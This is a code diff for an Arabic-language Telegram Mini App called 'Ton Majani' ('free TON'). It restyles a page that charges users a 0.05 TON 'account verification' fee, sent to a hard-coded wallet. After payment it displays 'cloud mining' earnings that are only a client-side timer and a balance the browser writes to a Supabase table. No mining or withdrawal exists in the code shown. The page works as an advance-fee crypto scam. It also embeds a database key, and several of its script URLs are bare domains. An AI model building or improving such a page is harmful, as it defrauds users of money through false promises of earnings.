@@ -5,103 +5,164 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>تون مجاني - Ton Majani</title>
   <script src="https://telegram.org"></script>
-  <script src="https://unpkg.com"></script>
   <script src="https://jsdelivr.net"></script>
-  <script src="https://tailwindcss.com"></script>
+  <script src="https://jsdelivr.net"></script>
   <style>
-    body { background-color: #0f172a; color: #f8fafc; font-family: system-ui, -apple-system, sans-serif; user-select: none; }
-    .glow { box-shadow: 0 0 25px rgba(56, 189, 248, 0.35); }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body {
+      background: radial-gradient(circle at top, #1e293b 0%, #090d16 100%);
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 16px;
+      user-select: none;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(30, 41, 59, 0.7);
+      backdrop-filter: blur(10px);
+      padding: 12px 16px;
+      border-radius: 18px;
+      border: 1px solid rgba(56, 189, 248, 0.2);
+    }
+    .app-title { font-size: 18px; font-weight: 800; color: #38bdf8; }
+    .user-tag { font-size: 12px; color: #94a3b8; margin-top: 2px; }
+    .main-card {
+      background: linear-gradient(145deg, rgba(30, 41, 59, 0.9), rgba(15, 23, 42, 0.95));
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      border-radius: 26px;
+      padding: 24px 20px;
+      text-align: center;
+      box-shadow: 0 10px 35px rgba(0, 136, 204, 0.2);
+      margin: 16px 0;
+    }
+    .badge {
+      display: inline-block;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+    .badge-unverified { background: rgba(245, 158, 11, 0.15); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
+    .badge-verified { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); }
+    .balance-label { font-size: 13px; color: #94a3b8; }
+    .balance-value { font-size: 36px; font-weight: 900; margin: 6px 0 20px; letter-spacing: -0.5px; }
+    .balance-value span { color: #38bdf8; font-size: 20px; }
+    .miner-box {
+      background: rgba(9, 13, 22, 0.75);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .miner-top { display: flex; justify-content: space-between; font-size: 12px; color: #94a3b8; margin-bottom: 10px; }
+    .speed-val { color: #34d399; font-weight: 700; }
+    .state-off { color: #fbbf24; font-weight: 700; }
+    .state-on { color: #34d399; font-weight: 700; }
+    .unclaimed-val { font-size: 28px; font-weight: 800; font-family: monospace; color: #7dd3fc; margin: 6px 0; }
+    .unclaimed-sub { font-size: 11px; color: #64748b; }
+    .btn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 16px;
+      font-size: 15px;
+      font-weight: 800;
+      color: #ffffff;
+      cursor: pointer;
+      transition: transform 0.15s;
+    }
+    .btn:active { transform: scale(0.97); }
+    .btn-verify { background: linear-gradient(90deg, #0284c7, #2563eb); box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4); }
+    .btn-claim { background: linear-gradient(90deg, #059669, #0d9488); box-shadow: 0 6px 20px rgba(5, 150, 105, 0.4); }
+    .hidden { display: none; }
+    .footer-note { text-align: center; font-size: 11px; color: #64748b; line-height: 1.6; padding: 0 10px; }
   </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-between p-4 pb-8">
+<body>
 
-  <!-- الرأس وزر المحفظة -->
-  <div class="w-full max-w-md flex justify-between items-center bg-slate-800/80 p-3 rounded-2xl border border-slate-700">
+  <div class="header">
     <div>
-      <h1 class="font-bold text-lg text-sky-400">تون مجاني 💎</h1>
-      <p id="user-name" class="text-xs text-slate-400">جاري التحميل...</p>
+      <div class="app-title">تون مجاني 💎</div>
+      <div id="user-name" class="user-tag">جاري الاتصال...</div>
     </div>
     <div id="ton-connect"></div>
   </div>
 
-  <!-- بطاقة الرصيد والتعدين -->
-  <div class="w-full max-w-md bg-gradient-to-b from-slate-800 to-slate-900 rounded-3xl p-6 border border-slate-700 text-center glow my-4">
-    <span id="status-badge" class="px-3 py-1 rounded-full text-xs font-semibold bg-amber-500/20 text-amber-400 border border-amber-500/30">
-      غير موثق ⚠️
-    </span>
+  <div class="main-card">
+    <div id="status-badge" class="badge badge-unverified">الحساب غير موثق ⚠️</div>
     
-    <div class="mt-5">
-      <p class="text-slate-400 text-sm">رصيدك الحالي</p>
-      <div class="text-4xl font-extrabold text-white mt-1 tracking-tight">
-        <span id="balance-display">0.000000</span> <span class="text-sky-400 text-xl">TON</span>
+    <div class="balance-label">إجمالي رصيدك القابل للسحب</div>
+    <div class="balance-value"><span id="balance-display" style="color:#fff;font-size:36px;">0.000000</span> <span>TON</span></div>
+
+    <div class="miner-box">
+      <div class="miner-top">
+        <span>السرعة: <span class="speed-val">0.5 TON / يوم</span></span>
+        <span id="mining-state" class="state-off">متوقف ⏸️</span>
       </div>
+      <div id="unclaimed-display" class="unclaimed-val">0.000000</div>
+      <div class="unclaimed-sub">الأرباح المُعدّنة حالياً</div>
     </div>
 
-    <!-- شاشة التعدين المباشر -->
-    <div class="mt-6 bg-slate-950/60 p-4 rounded-2xl border border-slate-800">
-      <div class="flex justify-between text-xs text-slate-400 mb-1">
-        <span>سرعة التعدين: <strong class="text-emerald-400">0.5 / يومياً</strong></span>
-        <span id="mining-state" class="text-amber-400">متوقف</span>
-      </div>
-      <div class="text-2xl font-mono font-bold text-sky-300 my-2" id="unclaimed-display">0.000000</div>
-      <p class="text-[11px] text-slate-500">الأرباح غير المُطالب بها</p>
-    </div>
+    <button id="verify-btn" class="btn btn-verify" onclick="verifyAccount()">
+      توثيق الحساب وتفعيل التعدين (0.05 TON) ⚡
+    </button>
 
-    <!-- أزرار التحكم (توثيق أو مطالبة) -->
-    <div class="mt-6">
-      <button id="verify-btn" onclick="verifyAccount()" class="w-full py-3.5 px-4 bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 text-white font-bold rounded-xl shadow-lg transition active:scale-95">
-        توثيق الحساب وتفعيل التعدين (0.05 TON)
-      </button>
-
-      <button id="claim-btn" onclick="claimProfit()" class="hidden w-full py-3.5 px-4 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-white font-bold rounded-xl shadow-lg transition active:scale-95">
-        المطالبة بالأرباح الآن (Claim) 💰
-      </button>
-    </div>
+    <button id="claim-btn" class="btn btn-claim hidden" onclick="claimProfit()">
+      جمع الأرباح إلى الرصيد (Claim) 💰
+    </button>
   </div>
 
-  <!-- تذييل توضيحي -->
-  <p class="text-center text-xs text-slate-500 max-w-xs">
-    يُطلب توثيق الحساب لمرة واحدة بقيمة 0.05 TON لمكافحة الحسابات الوهمية وتفعيل التعدين السحابي الدائم.
-  </p>
+  <div class="footer-note">
+    لحماية المنصة من البوتات والحسابات الوهمية، يُطلب توثيق المحفظة لمرة واحدة فقط بقيمة 0.05 TON لتفعيل التعدين السحابي الدائم.
+  </div>
 
   <script>
-    // 1. إعدادات قاعدة البيانات ومحفظتك
     const SUPABASE_URL = 'https://supabase.co';
     const SUPABASE_KEY = 'sb_publishable_LeqAYFFbNWS7oKgtlmWaUg_2xkbtBpl';
     const MY_WALLET = 'UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO';
-    
-    const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-    const tg = window.Telegram.WebApp;
-    tg.expand();
 
-    // بيانات المستخدم من تيليجرام (أو رقم تجريبي إذا فُتح من المتصفح)
-    const tgUser = tg.initDataUnsafe?.user || { id: 123456789, username: 'مستخدم_تجريبي' };
+    const tg = window.Telegram?.WebApp;
+    if (tg) tg.expand();
+
+    const tgUser = tg?.initDataUnsafe?.user || { id: 123456789, username: 'مستخدم_تجريبي' };
     document.getElementById('user-name').innerText = '@' + (tgUser.username || tgUser.first_name || tgUser.id);
+
+    let db = null;
+    if (window.supabase) {
+      db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    }
 
     let userData = null;
     let connectedWallet = null;
+    let tonConnectUI = null;
 
-    // 2. تهيئة ربط محفظة TON
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-      manifestUrl: window.location.origin + '/tonconnect-manifest.json',
-      buttonRootId: 'ton-connect'
-    });
+    if (window.TON_CONNECT_UI) {
+      tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
+        buttonRootId: 'ton-connect'
+      });
 
-    tonConnectUI.onStatusChange(async (wallet) => {
-      if (wallet) {
-        connectedWallet = wallet.account.address;
-        if (userData && !userData.wallet_address) {
-          await db.from('users').update({ wallet_address: connectedWallet }).eq('telegram_id', tgUser.id);
+      tonConnectUI.onStatusChange(async (wallet) => {
+        if (wallet) {
+          connectedWallet = wallet.account.address;
+          if (db && userData && !userData.wallet_address) {
+            await db.from('users').update({ wallet_address: connectedWallet }).eq('telegram_id', tgUser.id);
+          }
+        } else {
+          connectedWallet = null;
         }
-      } else {
-        connectedWallet = null;
-      }
-    });
+      });
+    }
 
-    // 3. جلب أو إنشاء بيانات المستخدم في Supabase
     async function loadUser() {
-      let { data, error } = await db.from('users').select('*').eq('telegram_id', tgUser.id).single();
-      
+      if (!db) return;
+      let { data } = await db.from('users').select('*').eq('telegram_id', tgUser.id).single();
       if (!data) {
         const newUser = {
           telegram_id: tgUser.id,
@@ -118,92 +179,80 @@
       updateUI();
     }
 
-    // 4. تحديث الشاشة وعداد التعدين الحي
     function updateUI() {
       if (!userData) return;
       document.getElementById('balance-display').innerText = Number(userData.balance).toFixed(6);
-
       if (userData.is_verified) {
         document.getElementById('status-badge').innerText = 'موثق ونشط ✅';
-        document.getElementById('status-badge').className = 'px-3 py-1 rounded-full text-xs font-semibold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
+        document.getElementById('status-badge').className = 'badge badge-verified';
         document.getElementById('mining-state').innerText = 'يعمل الآن ⚡';
-        document.getElementById('mining-state').className = 'text-emerald-400 font-bold';
+        document.getElementById('mining-state').className = 'state-on';
         document.getElementById('verify-btn').classList.add('hidden');
         document.getElementById('claim-btn').classList.remove('hidden');
       }
     }
 
-    // تحديث العداد كل ثانية
     setInterval(() => {
       if (userData && userData.is_verified) {
         const lastClaim = new Date(userData.last_claim).getTime();
-        const now = Date.now();
-        const secondsPassed = Math.max(0, (now - lastClaim) / 1000);
-        const speedPerSecond = Number(userData.mining_speed) / 86400; // 0.5 في اليوم
-        const mined = secondsPassed * speedPerSecond;
+        const secondsPassed = Math.max(0, (Date.now() - lastClaim) / 1000);
+        const mined = secondsPassed * (Number(userData.mining_speed) / 86400);
         document.getElementById('unclaimed-display').innerText = mined.toFixed(6);
       }
     }, 1000);
 
-    // 5. دالة التوثيق ودفع 0.05 TON
     async function verifyAccount() {
+      if (!tonConnectUI) {
+        alert('جاري تحميل أداة المحفظة، يرجى إعادة تحديث الصفحة من النقاط الثلاث بالأعلى.');
+        return;
+      }
       if (!connectedWallet) {
-        alert('يرجى ربط محفظة TON أولاً من الزر في الأعلى!');
         tonConnectUI.openModal();
         return;
       }
 
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [
-          {
-            address: MY_WALLET,
-            amount: "50000000" // 0.05 TON
-          }
-        ]
+        messages: [{ address: MY_WALLET, amount: "50000000" }]
       };
 
       try {
         const result = await tonConnectUI.sendTransaction(transaction);
-        if (result) {
+        if (result && db) {
           const nowIso = new Date().toISOString();
-          await db.from('users').update({ 
-            is_verified: true, 
+          await db.from('users').update({
+            is_verified: true,
             wallet_address: connectedWallet,
-            last_claim: nowIso 
+            last_claim: nowIso
           }).eq('telegram_id', tgUser.id);
-          
+
           userData.is_verified = true;
           userData.last_claim = nowIso;
           updateUI();
           alert('تم توثيق حسابك بنجاح وبدأ التعدين! 🎉');
         }
       } catch (e) {
-        alert('تم إلغاء عملية الدفع أو حدث خطأ.');
+        alert('تم إلغاء المعاملة أو لم تكتمل.');
       }
     }
 
-    // 6. دالة المطالبة بالأرباح
     async function claimProfit() {
       const unclaimed = parseFloat(document.getElementById('unclaimed-display').innerText);
       if (unclaimed <= 0.000001) {
-        alert('انتظر قليلاً لتجميع أرباح كافية للمطالبة!');
+        alert('انتظر قليلاً لتجميع أرباح كافية!');
         return;
       }
-
       const newBalance = Number(userData.balance) + unclaimed;
       const nowIso = new Date().toISOString();
 
-      await db.from('users').update({
-        balance: newBalance,
-        last_claim: nowIso
-      }).eq('telegram_id', tgUser.id);
-
+      if (db) {
+        await db.from('users').update({ balance: newBalance, last_claim: nowIso }).eq('telegram_id', tgUser.id);
+      }
       userData.balance = newBalance;
       userData.last_claim = nowIso;
       document.getElementById('unclaimed-display').innerText = '0.000000';
       updateUI();
-      alert('تمت إضافة ' + unclaimed.toFixed(6) + ' TON إلى رصيدك! 💰');
+      alert('تم جمع ' + unclaimed.toFixed(6) + ' TON بنجاح! 💰');
     }
 
     loadUser();
